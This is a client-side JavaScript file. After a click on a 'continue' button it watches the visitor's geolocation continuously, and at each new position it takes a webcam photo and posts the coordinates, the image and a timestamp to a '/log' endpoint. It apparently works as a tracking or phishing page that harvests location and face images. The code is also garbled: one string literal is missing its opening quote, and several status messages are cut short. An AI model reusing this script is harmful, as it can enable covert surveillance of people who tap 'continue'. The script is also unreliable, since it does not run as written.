let watchId = null;
let lastPosition = null;

function status(message) {
  document.getElementById('status').innerText = message;
}

function startTracking() {
  if (!navigator.geolocation) {
    status(not supported by your browser.');
    return;
  }


  watchId = navigator.geolocation.watchPosition(
    (position) => {
      const { latitude, longitude, accuracy } = position.coords;

      if (accuracy > 50) {
        status(`Ignored: ±${accuracy.toFixed(2)} meters`);
        return;
      }

      if (
        lastPosition &&
        latitude === lastPosition.latitude &&
        longitude === lastPosition.longitude
      ) {
        // Same position as before; ignore
        return;
      }

      lastPosition = { latitude, longitude };
      status(`Location acquired: Lat ${latitude.toFixed(6)}, Lon ${longitude.toFixed(6)}, Accuracy: ±${accuracy.toFixed(2)} meters`);

      capturePhoto({ latitude, longitude, accuracy });
    },
    (error) => {
      switch (error.code) {
        case error.PERMISSION_DENIED:
          status('User denied the request.');
          break;
        case error.POSITION_UNAVAILABLE:
          status('information is unavailable.');
          break;
        case error.TIMEOUT:
          status('The request to get user timed out.');
          break;
        case error.UNKNOWN_ERROR:
          status('An unknown error occurred.');
          break;
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}

async function capturePhoto(geo) {
  status('Capturing...');
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach((track) => track.stop());

    const dataURL = canvas.toDataURL('image/png');
    const preview = document.getElementById('preview');
    preview.src = dataURL;
    preview.style.display = 'block';

    const payload = {
      ...geo,
      photo: dataURL,
      timestamp: new Date().toISOString()
    };

    await fetch('/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    status('Data logged successfully ✔️');
  } catch (err) {
    status('' + err.message);
  }
}

document.getElementById('continueButton').addEventListener('click', () => {
  startTracking();
});
